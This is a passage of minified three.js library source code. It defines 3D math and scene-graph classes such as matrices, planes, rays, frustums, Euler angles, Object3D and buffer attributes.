k=this.elements;k[0]=a;k[1]=d;k[2]=g;k[3]=b;k[4]=e;k[5]=h;k[6]=c;k[7]=f;k[8]=m;return this},identity:function(){this.set(1,0,0,0,1,0,0,0,1);return this},clone:function(){return(new this.constructor).fromArray(this.elements)},copy:function(a){a=a.elements;this.set(a[0],a[3],a[6],a[1],a[4],a[7],a[2],a[5],a[8]);return this},setFromMatrix4:function(a){a=a.elements;this.set(a[0],a[4],a[8],a[1],a[5],a[9],\na[2],a[6],a[10]);return this},applyToBufferAttribute:function(){var a;return function(b){void 0===a&&(a=new q);for(var c=0,d=b.count;c<d;c++)a.x=b.getX(c),a.y=b.getY(c),a.z=b.getZ(c),a.applyMatrix3(this),b.setXYZ(c,a.x,a.y,a.z);return b}}(),multiplyScalar:function(a){var b=this.elements;b[0]*=a;b[3]*=a;b[6]*=a;b[1]*=a;b[4]*=a;b[7]*=a;b[2]*=a;b[5]*=a;b[8]*=a;return this},determinant:function(){var a=this.elements,b=a[0],c=a[1],d=a[2],e=a[3],f=a[4],g=a[5],h=a[6],m=a[7],a=a[8];return b*f*a-b*g*m-c*e*\na+c*g*h+d*e*m-d*f*h},getInverse:function(a,b){a&&a.isMatrix4&&console.error(\"THREE.Matrix3.getInverse no longer takes a Matrix4 argument.\");var c=a.elements,d=this.elements,e=c[0],f=c[1],g=c[2],h=c[3],m=c[4],k=c[5],l=c[6],p=c[7],c=c[8],n=c*m-k*p,u=k*l-c*h,q=p*h-m*l,r=e*n+f*u+g*q;if(0===r){if(!0===b)throw Error(\"THREE.Matrix3.getInverse(): can't invert matrix, determinant is 0\");console.warn(\"THREE.Matrix3.getInverse(): can't invert matrix, determinant is 0\");return this.identity()}r=1/r;d[0]=n*r;\nd[1]=(g*p-c*f)*r;d[2]=(k*f-g*m)*r;d[3]=u*r;d[4]=(c*e-g*l)*r;d[5]=(g*h-k*e)*r;d[6]=q*r;d[7]=(f*l-p*e)*r;d[8]=(m*e-f*h)*r;return this},transpose:function(){var a,b=this.elements;a=b[1];b[1]=b[3];b[3]=a;a=b[2];b[2]=b[6];b[6]=a;a=b[5];b[5]=b[7];b[7]=a;return this},getNormalMatrix:function(a){return this.setFromMatrix4(a).getInverse(this).transpose()},transposeIntoArray:function(a){var b=this.elements;a[0]=b[0];a[1]=b[3];a[2]=b[6];a[3]=b[1];a[4]=b[4];a[5]=b[7];a[6]=b[2];a[7]=b[5];a[8]=b[8];return this},\nfromArray:function(a,b){void 0===b&&(b=0);for(var c=0;9>c;c++)this.elements[c]=a[c+b];return this},toArray:function(a,b){void 0===a&&(a=[]);void 0===b&&(b=0);var c=this.elements;a[b]=c[0];a[b+1]=c[1];a[b+2]=c[2];a[b+3]=c[3];a[b+4]=c[4];a[b+5]=c[5];a[b+6]=c[6];a[b+7]=c[7];a[b+8]=c[8];return a}};la.prototype={constructor:la,set:function(a,b){this.normal.copy(a);this.constant=b;return this},setComponents:function(a,b,c,d){this.normal.set(a,b,c);this.constant=d;return this},setFromNormalAndCoplanarPoint:function(a,\nb){this.normal.copy(a);this.constant=-b.dot(this.normal);return this},setFromCoplanarPoints:function(){var a=new q,b=new q;return function(c,d,e){d=a.subVectors(e,d).cross(b.subVectors(c,d)).normalize();this.setFromNormalAndCoplanarPoint(d,c);return this}}(),clone:function(){return(new this.constructor).copy(this)},copy:function(a){this.normal.copy(a.normal);this.constant=a.constant;return this},normalize:function(){var a=1/this.normal.length();this.normal.multiplyScalar(a);this.constant*=a;return this},\nnegate:function(){this.constant*=-1;this.normal.negate();return this},distanceToPoint:function(a){return this.normal.dot(a)+this.constant},distanceToSphere:function(a){return this.distanceToPoint(a.center)-a.radius},projectPoint:function(a,b){return this.orthoPoint(a,b).sub(a).negate()},orthoPoint:function(a,b){var c=this.distanceToPoint(a);return(b||new q).copy(this.normal).multiplyScalar(c)},intersectLine:function(){var a=new q;return function(b,c){var d=c||new q,e=b.delta(a),f=this.normal.dot(e);\nif(0===f){if(0===this.distanceToPoint(b.start))return d.copy(b.start)}else return f=-(b.start.dot(this.normal)+this.constant)/f,0>f||1<f?void 0:d.copy(e).multiplyScalar(f).add(b.start)}}(),intersectsLine:function(a){var b=this.distanceToPoint(a.start);a=this.distanceToPoint(a.end);return 0>b&&0<a||0>a&&0<b},intersectsBox:function(a){return a.intersectsPlane(this)},intersectsSphere:function(a){return a.intersectsPlane(this)},coplanarPoint:function(a){return(a||new q).copy(this.normal).multiplyScalar(-this.constant)},\napplyMatrix4:function(){var a=new q,b=new ya;return function(c,d){var e=this.coplanarPoint(a).applyMatrix4(c),f=d||b.getNormalMatrix(c),f=this.normal.applyMatrix3(f).normalize();this.constant=-e.dot(f);return this}}(),translate:function(a){this.constant-=a.dot(this.normal);return this},equals:function(a){return a.normal.equals(this.normal)&&a.constant===this.constant}};tc.prototype={constructor:tc,set:function(a,b,c,d,e,f){var g=this.planes;g[0].copy(a);g[1].copy(b);g[2].copy(c);g[3].copy(d);g[4].copy(e);\ng[5].copy(f);return this},clone:function(){return(new this.constructor).copy(this)},copy:function(a){for(var b=this.planes,c=0;6>c;c++)b[c].copy(a.planes[c]);return this},setFromMatrix:function(a){var b=this.planes,c=a.elements;a=c[0];var d=c[1],e=c[2],f=c[3],g=c[4],h=c[5],m=c[6],k=c[7],l=c[8],p=c[9],n=c[10],u=c[11],q=c[12],r=c[13],A=c[14],c=c[15];b[0].setComponents(f-a,k-g,u-l,c-q).normalize();b[1].setComponents(f+a,k+g,u+l,c+q).normalize();b[2].setComponents(f+d,k+h,u+p,c+r).normalize();b[3].setComponents(f-\nd,k-h,u-p,c-r).normalize();b[4].setComponents(f-e,k-m,u-n,c-A).normalize();b[5].setComponents(f+e,k+m,u+n,c+A).normalize();return this},intersectsObject:function(){var a=new Na;return function(b){var c=b.geometry;null===c.boundingSphere&&c.computeBoundingSphere();a.copy(c.boundingSphere).applyMatrix4(b.matrixWorld);return this.intersectsSphere(a)}}(),intersectsSprite:function(){var a=new Na;return function(b){a.center.set(0,0,0);a.radius=.7071067811865476;a.applyMatrix4(b.matrixWorld);return this.intersectsSphere(a)}}(),\nintersectsSphere:function(a){var b=this.planes,c=a.center;a=-a.radius;for(var d=0;6>d;d++)if(b[d].distanceToPoint(c)<a)return!1;return!0},intersectsBox:function(){var a=new q,b=new q;return function(c){for(var d=this.planes,e=0;6>e;e++){var f=d[e];a.x=0<f.normal.x?c.min.x:c.max.x;b.x=0<f.normal.x?c.max.x:c.min.x;a.y=0<f.normal.y?c.min.y:c.max.y;b.y=0<f.normal.y?c.max.y:c.min.y;a.z=0<f.normal.z?c.min.z:c.max.z;b.z=0<f.normal.z?c.max.z:c.min.z;var g=f.distanceToPoint(a),f=f.distanceToPoint(b);if(0>\ng&&0>f)return!1}return!0}}(),containsPoint:function(a){for(var b=this.planes,c=0;6>c;c++)if(0>b[c].distanceToPoint(a))return!1;return!0}};cb.prototype={constructor:cb,set:function(a,b){this.origin.copy(a);this.direction.copy(b);return this},clone:function(){return(new this.constructor).copy(this)},copy:function(a){this.origin.copy(a.origin);this.direction.copy(a.direction);return this},at:function(a,b){return(b||new q).copy(this.direction).multiplyScalar(a).add(this.origin)},lookAt:function(a){this.direction.copy(a).sub(this.origin).normalize();\nreturn this},recast:function(){var a=new q;return function(b){this.origin.copy(this.at(b,a));return this}}(),closestPointToPoint:function(a,b){var c=b||new q;c.subVectors(a,this.origin);var d=c.dot(this.direction);return 0>d?c.copy(this.origin):c.copy(this.direction).multiplyScalar(d).add(this.origin)},distanceToPoint:function(a){return Math.sqrt(this.distanceSqToPoint(a))},distanceSqToPoint:function(){var a=new q;return function(b){var c=a.subVectors(b,this.origin).dot(this.direction);if(0>c)return this.origin.distanceToSquared(b);\na.copy(this.direction).multiplyScalar(c).add(this.origin);return a.distanceToSquared(b)}}(),distanceSqToSegment:function(){var a=new q,b=new q,c=new q;return function(d,e,f,g){a.copy(d).add(e).multiplyScalar(.5);b.copy(e).sub(d).normalize();c.copy(this.origin).sub(a);var h=.5*d.distanceTo(e),m=-this.direction.dot(b),k=c.dot(this.direction),l=-c.dot(b),p=c.lengthSq(),n=Math.abs(1-m*m),u;0<n?(d=m*l-k,e=m*k-l,u=h*n,0<=d?e>=-u?e<=u?(h=1/n,d*=h,e*=h,m=d*(d+m*e+2*k)+e*(m*d+e+2*l)+p):(e=h,d=Math.max(0,-(m*\ne+k)),m=-d*d+e*(e+2*l)+p):(e=-h,d=Math.max(0,-(m*e+k)),m=-d*d+e*(e+2*l)+p):e<=-u?(d=Math.max(0,-(-m*h+k)),e=0<d?-h:Math.min(Math.max(-h,-l),h),m=-d*d+e*(e+2*l)+p):e<=u?(d=0,e=Math.min(Math.max(-h,-l),h),m=e*(e+2*l)+p):(d=Math.max(0,-(m*h+k)),e=0<d?h:Math.min(Math.max(-h,-l),h),m=-d*d+e*(e+2*l)+p)):(e=0<m?-h:h,d=Math.max(0,-(m*e+k)),m=-d*d+e*(e+2*l)+p);f&&f.copy(this.direction).multiplyScalar(d).add(this.origin);g&&g.copy(b).multiplyScalar(e).add(a);return m}}(),intersectSphere:function(){var a=new q;\nreturn function(b,c){a.subVectors(b.center,this.origin);var d=a.dot(this.direction),e=a.dot(a)-d*d,f=b.radius*b.radius;if(e>f)return null;f=Math.sqrt(f-e);e=d-f;d+=f;return 0>e&&0>d?null:0>e?this.at(d,c):this.at(e,c)}}(),intersectsSphere:function(a){return this.distanceToPoint(a.center)<=a.radius},distanceToPlane:function(a){var b=a.normal.dot(this.direction);if(0===b)return 0===a.distanceToPoint(this.origin)?0:null;a=-(this.origin.dot(a.normal)+a.constant)/b;return 0<=a?a:null},intersectPlane:function(a,\nb){var c=this.distanceToPlane(a);return null===c?null:this.at(c,b)},intersectsPlane:function(a){var b=a.distanceToPoint(this.origin);return 0===b||0>a.normal.dot(this.direction)*b?!0:!1},intersectBox:function(a,b){var c,d,e,f,g;d=1/this.direction.x;f=1/this.direction.y;g=1/this.direction.z;var h=this.origin;0<=d?(c=(a.min.x-h.x)*d,d*=a.max.x-h.x):(c=(a.max.x-h.x)*d,d*=a.min.x-h.x);0<=f?(e=(a.min.y-h.y)*f,f*=a.max.y-h.y):(e=(a.max.y-h.y)*f,f*=a.min.y-h.y);if(c>f||e>d)return null;if(e>c||c!==c)c=e;\nif(f<d||d!==d)d=f;0<=g?(e=(a.min.z-h.z)*g,g*=a.max.z-h.z):(e=(a.max.z-h.z)*g,g*=a.min.z-h.z);if(c>g||e>d)return null;if(e>c||c!==c)c=e;if(g<d||d!==d)d=g;return 0>d?null:this.at(0<=c?c:d,b)},intersectsBox:function(){var a=new q;return function(b){return null!==this.intersectBox(b,a)}}(),intersectTriangle:function(){var a=new q,b=new q,c=new q,d=new q;return function(e,f,g,h,m){b.subVectors(f,e);c.subVectors(g,e);d.crossVectors(b,c);f=this.direction.dot(d);if(0<f){if(h)return null;h=1}else if(0>f)h=\n-1,f=-f;else return null;a.subVectors(this.origin,e);e=h*this.direction.dot(c.crossVectors(a,c));if(0>e)return null;g=h*this.direction.dot(b.cross(a));if(0>g||e+g>f)return null;e=-h*a.dot(d);return 0>e?null:this.at(e/f,m)}}(),applyMatrix4:function(a){this.direction.add(this.origin).applyMatrix4(a);this.origin.applyMatrix4(a);this.direction.sub(this.origin);this.direction.normalize();return this},equals:function(a){return a.origin.equals(this.origin)&&a.direction.equals(this.direction)}};db.RotationOrders=\n\"XYZ YZX ZXY XZY YXZ ZYX\".split(\" \");db.DefaultOrder=\"XYZ\";db.prototype={constructor:db,isEuler:!0,get x(){return this._x},set x(a){this._x=a;this.onChangeCallback()},get y(){return this._y},set y(a){this._y=a;this.onChangeCallback()},get z(){return this._z},set z(a){this._z=a;this.onChangeCallback()},get order(){return this._order},set order(a){this._order=a;this.onChangeCallback()},set:function(a,b,c,d){this._x=a;this._y=b;this._z=c;this._order=d||this._order;this.onChangeCallback();return this},\nclone:function(){return new this.constructor(this._x,this._y,this._z,this._order)},copy:function(a){this._x=a._x;this._y=a._y;this._z=a._z;this._order=a._order;this.onChangeCallback();return this},setFromRotationMatrix:function(a,b,c){var d=N.clamp,e=a.elements;a=e[0];var f=e[4],g=e[8],h=e[1],m=e[5],k=e[9],l=e[2],p=e[6],e=e[10];b=b||this._order;\"XYZ\"===b?(this._y=Math.asin(d(g,-1,1)),.99999>Math.abs(g)?(this._x=Math.atan2(-k,e),this._z=Math.atan2(-f,a)):(this._x=Math.atan2(p,m),this._z=0)):\"YXZ\"===\nb?(this._x=Math.asin(-d(k,-1,1)),.99999>Math.abs(k)?(this._y=Math.atan2(g,e),this._z=Math.atan2(h,m)):(this._y=Math.atan2(-l,a),this._z=0)):\"ZXY\"===b?(this._x=Math.asin(d(p,-1,1)),.99999>Math.abs(p)?(this._y=Math.atan2(-l,e),this._z=Math.atan2(-f,m)):(this._y=0,this._z=Math.atan2(h,a))):\"ZYX\"===b?(this._y=Math.asin(-d(l,-1,1)),.99999>Math.abs(l)?(this._x=Math.atan2(p,e),this._z=Math.atan2(h,a)):(this._x=0,this._z=Math.atan2(-f,m))):\"YZX\"===b?(this._z=Math.asin(d(h,-1,1)),.99999>Math.abs(h)?(this._x=\nMath.atan2(-k,m),this._y=Math.atan2(-l,a)):(this._x=0,this._y=Math.atan2(g,e))):\"XZY\"===b?(this._z=Math.asin(-d(f,-1,1)),.99999>Math.abs(f)?(this._x=Math.atan2(p,m),this._y=Math.atan2(g,a)):(this._x=Math.atan2(-k,e),this._y=0)):console.warn(\"THREE.Euler: .setFromRotationMatrix() given unsupported order: \"+b);this._order=b;if(!1!==c)this.onChangeCallback();return this},setFromQuaternion:function(){var a;return function(b,c,d){void 0===a&&(a=new S);a.makeRotationFromQuaternion(b);return this.setFromRotationMatrix(a,\nc,d)}}(),setFromVector3:function(a,b){return this.set(a.x,a.y,a.z,b||this._order)},reorder:function(){var a=new ca;return function(b){a.setFromEuler(this);return this.setFromQuaternion(a,b)}}(),equals:function(a){return a._x===this._x&&a._y===this._y&&a._z===this._z&&a._order===this._order},fromArray:function(a){this._x=a[0];this._y=a[1];this._z=a[2];void 0!==a[3]&&(this._order=a[3]);this.onChangeCallback();return this},toArray:function(a,b){void 0===a&&(a=[]);void 0===b&&(b=0);a[b]=this._x;a[b+1]=\nthis._y;a[b+2]=this._z;a[b+3]=this._order;return a},toVector3:function(a){return a?a.set(this._x,this._y,this._z):new q(this._x,this._y,this._z)},onChange:function(a){this.onChangeCallback=a;return this},onChangeCallback:function(){}};nd.prototype={constructor:nd,set:function(a){this.mask=1<<a},enable:function(a){this.mask|=1<<a},toggle:function(a){this.mask^=1<<a},disable:function(a){this.mask&=~(1<<a)},test:function(a){return 0!==(this.mask&a.mask)}};var Bf=0;x.DefaultUp=new q(0,1,0);x.DefaultMatrixAutoUpdate=\n!0;x.prototype={constructor:x,isObject3D:!0,applyMatrix:function(a){this.matrix.multiplyMatrices(a,this.matrix);this.matrix.decompose(this.position,this.quaternion,this.scale)},setRotationFromAxisAngle:function(a,b){this.quaternion.setFromAxisAngle(a,b)},setRotationFromEuler:function(a){this.quaternion.setFromEuler(a,!0)},setRotationFromMatrix:function(a){this.quaternion.setFromRotationMatrix(a)},setRotationFromQuaternion:function(a){this.quaternion.copy(a)},rotateOnAxis:function(){var a=new ca;return function(b,\nc){a.setFromAxisAngle(b,c);this.quaternion.multiply(a);return this}}(),rotateX:function(){var a=new q(1,0,0);return function(b){return this.rotateOnAxis(a,b)}}(),rotateY:function(){var a=new q(0,1,0);return function(b){return this.rotateOnAxis(a,b)}}(),rotateZ:function(){var a=new q(0,0,1);return function(b){return this.rotateOnAxis(a,b)}}(),translateOnAxis:function(){var a=new q;return function(b,c){a.copy(b).applyQuaternion(this.quaternion);this.position.add(a.multiplyScalar(c));return this}}(),\ntranslateX:function(){var a=new q(1,0,0);return function(b){return this.translateOnAxis(a,b)}}(),translateY:function(){var a=new q(0,1,0);return function(b){return this.translateOnAxis(a,b)}}(),translateZ:function(){var a=new q(0,0,1);return function(b){return this.translateOnAxis(a,b)}}(),localToWorld:function(a){return a.applyMatrix4(this.matrixWorld)},worldToLocal:function(){var a=new S;return function(b){return b.applyMatrix4(a.getInverse(this.matrixWorld))}}(),lookAt:function(){var a=new S;return function(b){a.lookAt(b,\nthis.position,this.up);this.quaternion.setFromRotationMatrix(a)}}(),add:function(a){if(1<arguments.length){for(var b=0;b<arguments.length;b++)this.add(arguments[b]);return this}if(a===this)return console.error(\"THREE.Object3D.add: object can't be added as a child of itself.\",a),this;a&&a.isObject3D?(null!==a.parent&&a.parent.remove(a),a.parent=this,a.dispatchEvent({type:\"added\"}),this.children.push(a)):console.error(\"THREE.Object3D.add: object not an instance of THREE.Object3D.\",a);return this},remove:function(a){if(1<\narguments.length)for(var b=0;b<arguments.length;b++)this.remove(arguments[b]);b=this.children.indexOf(a);-1!==b&&(a.parent=null,a.dispatchEvent({type:\"removed\"}),this.children.splice(b,1))},getObjectById:function(a){return this.getObjectByProperty(\"id\",a)},getObjectByName:function(a){return this.getObjectByProperty(\"name\",a)},getObjectByProperty:function(a,b){if(this[a]===b)return this;for(var c=0,d=this.children.length;c<d;c++){var e=this.children[c].getObjectByProperty(a,b);if(void 0!==e)return e}},\ngetWorldPosition:function(a){a=a||new q;this.updateMatrixWorld(!0);return a.setFromMatrixPosition(this.matrixWorld)},getWorldQuaternion:function(){var a=new q,b=new q;return function(c){c=c||new ca;this.updateMatrixWorld(!0);this.matrixWorld.decompose(a,c,b);return c}}(),getWorldRotation:function(){var a=new ca;return function(b){b=b||new db;this.getWorldQuaternion(a);return b.setFromQuaternion(a,this.rotation.order,!1)}}(),getWorldScale:function(){var a=new q,b=new ca;return function(c){c=c||new q;\nthis.updateMatrixWorld(!0);this.matrixWorld.decompose(a,b,c);return c}}(),getWorldDirection:function(){var a=new ca;return function(b){b=b||new q;this.getWorldQuaternion(a);return b.set(0,0,1).applyQuaternion(a)}}(),raycast:function(){},traverse:function(a){a(this);for(var b=this.children,c=0,d=b.length;c<d;c++)b[c].traverse(a)},traverseVisible:function(a){if(!1!==this.visible){a(this);for(var b=this.children,c=0,d=b.length;c<d;c++)b[c].traverseVisible(a)}},traverseAncestors:function(a){var b=this.parent;\nnull!==b&&(a(b),b.traverseAncestors(a))},updateMatrix:function(){this.matrix.compose(this.position,this.quaternion,this.scale);this.matrixWorldNeedsUpdate=!0},updateMatrixWorld:function(a){!0===this.matrixAutoUpdate&&this.updateMatrix();if(!0===this.matrixWorldNeedsUpdate||!0===a)null===this.parent?this.matrixWorld.copy(this.matrix):this.matrixWorld.multiplyMatrices(this.parent.matrixWorld,this.matrix),this.matrixWorldNeedsUpdate=!1,a=!0;for(var b=this.children,c=0,d=b.length;c<d;c++)b[c].updateMatrixWorld(a)},\ntoJSON:function(a){function b(a){var b=[],c;for(c in a){var d=a[c];delete d.metadata;b.push(d)}return b}var c=void 0===a||\"\"===a,d={};c&&(a={geometries:{},materials:{},textures:{},images:{}},d.metadata={version:4.4,type:\"Object\",generator:\"Object3D.toJSON\"});var e={};e.uuid=this.uuid;e.type=this.type;\"\"!==this.name&&(e.name=this.name);\"{}\"!==JSON.stringify(this.userData)&&(e.userData=this.userData);!0===this.castShadow&&(e.castShadow=!0);!0===this.receiveShadow&&(e.receiveShadow=!0);!1===this.visible&&\n(e.visible=!1);e.matrix=this.matrix.toArray();void 0!==this.geometry&&(void 0===a.geometries[this.geometry.uuid]&&(a.geometries[this.geometry.uuid]=this.geometry.toJSON(a)),e.geometry=this.geometry.uuid);void 0!==this.material&&(void 0===a.materials[this.material.uuid]&&(a.materials[this.material.uuid]=this.material.toJSON(a)),e.material=this.material.uuid);if(0<this.children.length){e.children=[];for(var f=0;f<this.children.length;f++)e.children.push(this.children[f].toJSON(a).object)}if(c){var c=\nb(a.geometries),f=b(a.materials),g=b(a.textures);a=b(a.images);0<c.length&&(d.geometries=c);0<f.length&&(d.materials=f);0<g.length&&(d.textures=g);0<a.length&&(d.images=a)}d.object=e;return d},clone:function(a){return(new this.constructor).copy(this,a)},copy:function(a,b){void 0===b&&(b=!0);this.name=a.name;this.up.copy(a.up);this.position.copy(a.position);this.quaternion.copy(a.quaternion);this.scale.copy(a.scale);this.matrix.copy(a.matrix);this.matrixWorld.copy(a.matrixWorld);this.matrixAutoUpdate=\na.matrixAutoUpdate;this.matrixWorldNeedsUpdate=a.matrixWorldNeedsUpdate;this.layers.mask=a.layers.mask;this.visible=a.visible;this.castShadow=a.castShadow;this.receiveShadow=a.receiveShadow;this.frustumCulled=a.frustumCulled;this.renderOrder=a.renderOrder;this.userData=JSON.parse(JSON.stringify(a.userData));if(!0===b)for(var c=0;c<a.children.length;c++)this.add(a.children[c].clone());return this}};Object.assign(x.prototype,pa.prototype);hb.prototype={constructor:hb,set:function(a,b){this.start.copy(a);\nthis.end.copy(b);return this},clone:function(){return(new this.constructor).copy(this)},copy:function(a){this.start.copy(a.start);this.end.copy(a.end);return this},getCenter:function(a){return(a||new q).addVectors(this.start,this.end).multiplyScalar(.5)},delta:function(a){return(a||new q).subVectors(this.end,this.start)},distanceSq:function(){return this.start.distanceToSquared(this.end)},distance:function(){return this.start.distanceTo(this.end)},at:function(a,b){var c=b||new q;return this.delta(c).multiplyScalar(a).add(this.start)},\nclosestPointToPointParameter:function(){var a=new q,b=new q;return function(c,d){a.subVectors(c,this.start);b.subVectors(this.end,this.start);var e=b.dot(b),e=b.dot(a)/e;d&&(e=N.clamp(e,0,1));return e}}(),closestPointToPoint:function(a,b,c){a=this.closestPointToPointParameter(a,b);c=c||new q;return this.delta(c).multiplyScalar(a).add(this.start)},applyMatrix4:function(a){this.start.applyMatrix4(a);this.end.applyMatrix4(a);return this},equals:function(a){return a.start.equals(this.start)&&a.end.equals(this.end)}};\nza.normal=function(){var a=new q;return function(b,c,d,e){e=e||new q;e.subVectors(d,c);a.subVectors(b,c);e.cross(a);b=e.lengthSq();return 0<b?e.multiplyScalar(1/Math.sqrt(b)):e.set(0,0,0)}}();za.barycoordFromPoint=function(){var a=new q,b=new q,c=new q;return function(d,e,f,g,h){a.subVectors(g,e);b.subVectors(f,e);c.subVectors(d,e);d=a.dot(a);e=a.dot(b);f=a.dot(c);var m=b.dot(b);g=b.dot(c);var k=d*m-e*e;h=h||new q;if(0===k)return h.set(-2,-1,-1);k=1/k;m=(m*f-e*g)*k;d=(d*g-e*f)*k;return h.set(1-m-\nd,d,m)}}();za.containsPoint=function(){var a=new q;return function(b,c,d,e){b=za.barycoordFromPoint(b,c,d,e,a);return 0<=b.x&&0<=b.y&&1>=b.x+b.y}}();za.prototype={constructor:za,set:function(a,b,c){this.a.copy(a);this.b.copy(b);this.c.copy(c);return this},setFromPointsAndIndices:function(a,b,c,d){this.a.copy(a[b]);this.b.copy(a[c]);this.c.copy(a[d]);return this},clone:function(){return(new this.constructor).copy(this)},copy:function(a){this.a.copy(a.a);this.b.copy(a.b);this.c.copy(a.c);return this},\narea:function(){var a=new q,b=new q;return function(){a.subVectors(this.c,this.b);b.subVectors(this.a,this.b);return.5*a.cross(b).length()}}(),midpoint:function(a){return(a||new q).addVectors(this.a,this.b).add(this.c).multiplyScalar(1/3)},normal:function(a){return za.normal(this.a,this.b,this.c,a)},plane:function(a){return(a||new la).setFromCoplanarPoints(this.a,this.b,this.c)},barycoordFromPoint:function(a,b){return za.barycoordFromPoint(a,this.a,this.b,this.c,b)},containsPoint:function(a){return za.containsPoint(a,\nthis.a,this.b,this.c)},closestPointToPoint:function(){var a,b,c,d;return function(e,f){void 0===a&&(a=new la,b=[new hb,new hb,new hb],c=new q,d=new q);var g=f||new q,h=Infinity;a.setFromCoplanarPoints(this.a,this.b,this.c);a.projectPoint(e,c);if(!0===this.containsPoint(c))g.copy(c);else{b[0].set(this.a,this.b);b[1].set(this.b,this.c);b[2].set(this.c,this.a);for(var m=0;m<b.length;m++){b[m].closestPointToPoint(c,!0,d);var k=c.distanceToSquared(d);k<h&&(h=k,g.copy(d))}}return g}}(),equals:function(a){return a.a.equals(this.a)&&\na.b.equals(this.b)&&a.c.equals(this.c)}};ha.prototype={constructor:ha,clone:function(){return(new this.constructor).copy(this)},copy:function(a){this.a=a.a;this.b=a.b;this.c=a.c;this.normal.copy(a.normal);this.color.copy(a.color);this.materialIndex=a.materialIndex;for(var b=0,c=a.vertexNormals.length;b<c;b++)this.vertexNormals[b]=a.vertexNormals[b].clone();b=0;for(c=a.vertexColors.length;b<c;b++)this.vertexColors[b]=a.vertexColors[b].clone();return this}};Ka.prototype=Object.create(X.prototype);Ka.prototype.constructor=\nKa;Ka.prototype.isMeshBasicMaterial=!0;Ka.prototype.copy=function(a){X.prototype.copy.call(this,a);this.color.copy(a.color);this.map=a.map;this.lightMap=a.lightMap;this.lightMapIntensity=a.lightMapIntensity;this.aoMap=a.aoMap;this.aoMapIntensity=a.aoMapIntensity;this.specularMap=a.specularMap;this.alphaMap=a.alphaMap;this.envMap=a.envMap;this.combine=a.combine;this.reflectivity=a.reflectivity;this.refractionRatio=a.refractionRatio;this.wireframe=a.wireframe;this.wireframeLinewidth=a.wireframeLinewidth;\nthis.wireframeLinecap=a.wireframeLinecap;this.wireframeLinejoin=a.wireframeLinejoin;this.skinning=a.skinning;this.morphTargets=a.morphTargets;return this};U.prototype={constructor:U,isBufferAttribute:!0,set needsUpdate(a){!0===a&&this.version++},setArray:function(a){if(Array.isArray(a))throw new TypeError(\"THREE.BufferAttribute: array should be a Typed Array.\");this.count=void 0!==a?a.length/this.itemSize:0;this.array=a},setDynamic:function(a){this.dynamic=a;return this},copy:function(a){this.array=\nnew a.array.constructor(a.array);this.itemSize=a.itemSize;this.count=a.count;this.normalized=a.normalized;this.dynamic=a.dynamic;return this},copyAt:function(a,b,c){a*=this.itemSize;c*=b.itemSize;for(var d=0,e=this.itemSize;d<e;d++)this.array[a+d]=b.array[c+d];return this},copyArray:function(a){this.array.set(a);return this},copyColorsArray:function(a){for(var b=this.array,c=0,d=0,e=a.length;d<e;d++){var f=a[d];void 0===f&&(console.warn(\"THREE.BufferAttribute.copyColorsArray(): color is undefined\",\nd),f=new J);b[c++]=f.r;b[c++]=f.g;b[c++]=f.b}return this},copyIndicesArray:function(a){for(var b=this.array,c=0,d=0,e=a.length;d<e;d++){var f=a[d];b[c++]=f.a;b[c++]=f.b;b[c++]=f.c}return this},copyVector2sArray:function(a){for(var b=this.array,c=0,d=0,e=a.length;d<e;d++){var f=a[d];void 0===f&&(console.warn(\"THREE.BufferAttribute.copyVector2sArray(): vector is undefined\",d),f=new D);b[c++]=f.x;b[c++]=f.y}return this},copyVector3sArray:function(a){for(var b=this.array,c=0,d=0,e=a.length;d<e;d++){var f=\na[d];void 0===f&&(console.warn(\"THREE.BufferAttribute.copyVector3sArray(): vector is undefined\",d),f=new q);b[c++]=f.x;b[c++]=f.y;b[c++]=f.z}return this},copyVector4sArray:function(a){for(var b=this.array,c=0,d=0,e=a.length;d<e;d++){var f=a[d];void 0===f&&(console.warn(\"THREE.BufferAttribute.copyVector4sArray(): vector is undefined\",d),f=new fa);b[c++]=f.x;b[c++]=f.y;b[c++]=f.z;b[c++]=f.w}return this},set:function(a,b){void 0===b&&(b=0);this.array.set(a,b);return this},getX:function(a){return this.array[a*\nthis.itemSize]},setX:function(a,b){this.array[a*this.itemSize]=b;return this},getY:function(a){return this.array[a*this.itemSize+1]},setY:function(a,b){this.array[a*this.itemSize+1]=b;return this},getZ:function(a){return this.array[a*this.itemSize+2]},setZ:function(a,b){this.array[a*this.itemSize+2]=b;return this},getW:function(a){return this.array[a*this.itemSize+3]},setW:function(a,b){this.array[a*this.itemSize+3]=b;return this},setXY:function(a,b,c){a*=this.itemSize;this.array[a+0]=b;this.array[a+\n1]=c;return this},setXYZ:function(a,b,c,d){a*=this.itemSize;this.array[a+0]=b;this.array[a+1]=c;this.array[a+2]=d;return this},setXYZW:function(a,b,c,d,e){a*=this.itemSize;this.array[a+0]=b;this.array[a+1]=c;this.array[a+2]=d;this.array[a+3]=e;return this},onUpload:function(a){this.onUploadCallback=a;return this},clone:function(){return(new this.constructor(this.array,this.itemSize)).copy(this)}};uc.prototype=Object.create(U.prototype);uc.prototype.constructor=uc;vc.prototype=Object.create(U.prototype);\nvc.prototype.constructor=vc;wc.prototype=Object.create(U.prototype);wc.prototype.constructor=wc;xc.prototype=Object.create(U.prototype);xc.prototype.constructor=xc;ib.prototype=Object.create(U.prototype);ib.prototype.constructor=ib;yc.prototype=Object.create(U.prototype);yc.prototype.constructor=yc;jb.prototype=Object.create(U.prototype);jb.prototype.constructor=jb;z.prototype=Object.create(U.prototype);z.prototype.constructor=z;zc.prototype=Object.create(U.prototype);zc.prototype.constructor=zc;\nObject.assign(Me.prototype,{computeGroups:function(a){var b,c=[],d=void 0;a=a.faces;for(var e=0;e<a.length;e++){var f=a[e];f.materialIndex!==d&&(d=f.materialIndex,void 0!==b&&(b.count=3*e-b.start,c.push(b)),b={start:3*e,materialIndex:d})}void 0!==b&&(b.count=3*e-b.start,c.push(b));this.groups=c},fromGeometry:function(a){var b=a.faces,c=a.vertices,d=a.faceVertexUvs,e=d[0]&&0<d[0].length,f=d[1]&&0<d[1].length,g=a.morphTargets,h=g.length,m;if(0<h){m=[];for(var k=0;k<h;k++)m[k]=[];this.morphTargets.position=\nm}var l=a.morphNormals,p=l.length,n;if(0<p){n=[];for(k=0;k<p;k++)n[k]=[];this.morphTargets.normal=n}for(var u=a.skinIndices,q=a.skinWeights,r=u.length===c.length,A=q.length===c.length,k=0;k<b.length;k++){var w=b[k];this.vertices.push(c[w.a],c[w.b],c[w.c]);var 